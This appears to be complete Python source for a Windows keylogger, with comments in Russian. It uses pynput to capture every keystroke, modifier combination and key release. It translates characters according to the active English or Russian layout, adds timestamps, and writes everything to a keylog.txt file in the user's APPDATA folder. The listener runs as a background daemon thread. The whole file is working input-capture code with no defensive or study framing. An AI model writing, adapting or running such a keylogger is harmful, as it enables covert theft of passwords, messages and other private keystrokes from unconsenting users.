import os
import threading
from pynput import keyboard
import time
import ctypes
import sys
from datetime import datetime

APPDATA = os.getenv('APPDATA')
LOG_PATH = os.path.join(APPDATA, 'keylog.txt')
MAX_SIZE = 30 * 1024 * 1024  # 30 МБ
TIME_GAP = 30  # секунд для отметки времени
LONG_GAP = 1800  # 30 минут для визуального разделения

SPECIAL_KEYS = {
    keyboard.Key.shift: 'shift',
    keyboard.Key.shift_r: 'shift',
    keyboard.Key.shift_l: 'shift',
    keyboard.Key.ctrl: 'ctrl',
    keyboard.Key.ctrl_l: 'ctrl',
    keyboard.Key.ctrl_r: 'ctrl',
    keyboard.Key.alt: 'alt',
    keyboard.Key.alt_l: 'alt',
    keyboard.Key.alt_r: 'alt',
    keyboard.Key.esc: 'esc',
    keyboard.Key.enter: 'enter',
    keyboard.Key.tab: 'tab',
    keyboard.Key.backspace: 'backspace',
    keyboard.Key.caps_lock: 'capslock',
    keyboard.Key.space: 'space',
    keyboard.Key.cmd: 'win',
    keyboard.Key.cmd_l: 'win',
    keyboard.Key.cmd_r: 'win',
    keyboard.Key.delete: 'delete',
    keyboard.Key.insert: 'insert',
    keyboard.Key.home: 'home',
    keyboard.Key.end: 'end',
    keyboard.Key.page_up: 'pageup',
    keyboard.Key.page_down: 'pagedown',
    keyboard.Key.up: 'up',
    keyboard.Key.down: 'down',
    keyboard.Key.left: 'left',
    keyboard.Key.right: 'right',
    keyboard.Key.f1: 'f1',
    keyboard.Key.f2: 'f2',
    keyboard.Key.f3: 'f3',
    keyboard.Key.f4: 'f4',
    keyboard.Key.f5: 'f5',
    keyboard.Key.f6: 'f6',
    keyboard.Key.f7: 'f7',
    keyboard.Key.f8: 'f8',
    keyboard.Key.f9: 'f9',
    keyboard.Key.f10: 'f10',
    keyboard.Key.f11: 'f11',
    keyboard.Key.f12: 'f12',
}

# Маппинг для русской и английской раскладки (основные символы)
EN_RU_MAP = {
    'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з',
    '[': 'х', ']': 'ъ', 'a': 'ф', 's': 'ы', 'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л',
    'l': 'д', ';': 'ж', "'": 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь',
    ',': 'б', '.': 'ю', '/': '.', '`': 'ё',
    'Q': 'Й', 'W': 'Ц', 'E': 'У', 'R': 'К', 'T': 'Е', 'Y': 'Н', 'U': 'Г', 'I': 'Ш', 'O': 'Щ', 'P': 'З',
    '{': 'Х', '}': 'Ъ', 'A': 'Ф', 'S': 'Ы', 'D': 'В', 'F': 'А', 'G': 'П', 'H': 'Р', 'J': 'О', 'K': 'Л',
    'L': 'Д', ':': 'Ж', '"': 'Э', 'Z': 'Я', 'X': 'Ч', 'C': 'С', 'V': 'М', 'B': 'И', 'N': 'Т', 'M': 'Ь',
    '<': 'Б', '>': 'Ю', '?': ',', '~': 'Ё',
}
RU_EN_MAP = {v: k for k, v in EN_RU_MAP.items()}

# Получение текущей раскладки клавиатуры (Windows)
def get_current_layout():
    if sys.platform != 'win32':
        return 'unknown'
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    GetKeyboardLayout = user32.GetKeyboardLayout
    GetWindowThreadProcessId = user32.GetWindowThreadProcessId
    GetForegroundWindow = user32.GetForegroundWindow
    hwnd = GetForegroundWindow()
    thread_id = GetWindowThreadProcessId(hwnd, 0)
    layout_id = GetKeyboardLayout(thread_id) & 0xFFFF
    # 0x409 = en, 0x419 = ru
    if layout_id == 0x409:
        return 'EN'
    elif layout_id == 0x419:
        return 'RU'
    else:
        return hex(layout_id)

def map_char_by_layout(char, layout):
    if layout == 'EN':
        return char
    elif layout == 'RU':
        return EN_RU_MAP.get(char, char)
    else:
        return char

def get_key_name(key):
    # Получить имя физической клавиши (буква/цифра)
    if hasattr(key, 'char') and key.char is not None:
        return key.char
    elif hasattr(key, 'vk'):
        # Для спецклавиш
        return str(key.vk)
    else:
        return str(key)

class KeyLogger:
    def __init__(self, log_path=LOG_PATH, max_size=MAX_SIZE):
        self.log_path = log_path
        self.max_size = max_size
        self.lock = threading.Lock()
        self._pressed_special = set()
        self._text_buffer = ''
        self._last_event = None  # 'text' или 'special'
        self._last_layout = get_current_layout()
        self._modifiers = set()
        self.listener = None
        self.last_event_time = time.time()
        self.last_timestamp = self._load_last_timestamp()
        self._init_logfile()

    def _init_logfile(self):
        if not os.path.exists(self.log_path) or os.path.getsize(self.log_path) == 0:
            self._write_first_timestamp()

    def _write_first_timestamp(self):
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.log_path, 'w', encoding='utf-8') as f:
            f.write(f'LAST_TIMESTAMP: {now}\n')
        self.last_timestamp = now

    def _load_last_timestamp(self):
        if os.path.exists(self.log_path):
            with open(self.log_path, 'r', encoding='utf-8') as f:
                first = f.readline()
                if first.startswith('LAST_TIMESTAMP: '):
                    return first.strip().split('LAST_TIMESTAMP: ')[-1]
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    def _update_last_timestamp(self):
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with self.lock:
            lines = []
            if os.path.exists(self.log_path):
                with open(self.log_path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
            if lines and lines[0].startswith('LAST_TIMESTAMP: '):
                lines[0] = f'LAST_TIMESTAMP: {now}\n'
            else:
                lines = [f'LAST_TIMESTAMP: {now}\n'] + lines
            with open(self.log_path, 'w', encoding='utf-8') as f:
                f.writelines(lines)
        self.last_timestamp = now

    def _check_size(self):
        if os.path.exists(self.log_path) and os.path.getsize(self.log_path) >= self.max_size:
            self._write_first_timestamp()

    def _write(self, text):
        self._check_size()
        with self.lock:
            with open(self.log_path, 'a', encoding='utf-8') as f:
                f.write(text)
        self._update_last_timestamp()

    def _flush_text(self):
        if self._text_buffer:
            layout = get_current_layout()
            if layout != self._last_layout:
                self._write(f'[РАСКЛАДКА: {layout}]\n')
                self._last_layout = layout
            self._write(self._text_buffer + '\n')
            self._text_buffer = ''

    def _maybe_add_time(self):
        now = time.time()
        gap = now - self.last_event_time
        if gap > LONG_GAP:
            self._write('\n\n')
        if gap > TIME_GAP:
            dt = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self._write(f'[{dt}]\n')
        self.last_event_time = now

    def on_press(self, key):
        self._maybe_add_time()
        layout = get_current_layout()
        # Модификаторы
        if key in [keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            self._modifiers.add('ctrl')
        if key in [keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r]:
            self._modifiers.add('alt')
        if key in [keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r]:
            self._modifiers.add('shift')
        # Спецклавиши
        if key in SPECIAL_KEYS:
            if self._last_event == 'text':
                self._flush_text()
            if key not in self._pressed_special:
                self._pressed_special.add(key)
                self._write(f'<{SPECIAL_KEYS[key]} нажат>\n')
            self._last_event = 'special'
        else:
            # Если зажаты модификаторы и нажата буква/цифра
            if self._modifiers:
                key_name = get_key_name(key)
                if len(key_name) == 1:
                    mapped = map_char_by_layout(key_name, layout)
                    mods = '+'.join(sorted(self._modifiers))
                    self._flush_text()
                    self._write(f'<{mods}+{mapped}>\n')
                    self._last_event = 'special'
                    return
            try:
                char = key.char
                mapped_char = map_char_by_layout(char, layout)
                if layout != self._last_layout:
                    self._flush_text()
                    self._write(f'[РАСКЛАДКА: {layout}]\n')
                    self._last_layout = layout
                self._text_buffer += mapped_char
                self._last_event = 'text'
            except AttributeError:
                pass

    def on_release(self, key):
        self._maybe_add_time()
        if key in [keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            self._modifiers.discard('ctrl')
        if key in [keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r]:
            self._modifiers.discard('alt')
        if key in [keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r]:
            self._modifiers.discard('shift')
        if key in SPECIAL_KEYS:
            if self._last_event == 'text':
                self._flush_text()
            if key in self._pressed_special:
                self._pressed_special.remove(key)
                self._write(f'<{SPECIAL_KEYS[key]} отпущен>\n')
            self._last_event = 'special'

    def start(self):
        if self.listener and self.listener.running:
            return self.listener
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.daemon = True
        self.listener.start()
        return self.listener

    def stop(self):
        if self.listener and self.listener.running:
            self.listener.stop()

# Для запуска/остановки кейлоггера:
keylogger_instance = KeyLogger()
def start_keylogger():
    keylogger_instance.start()
def stop_keylogger():
    keylogger_instance.stop() 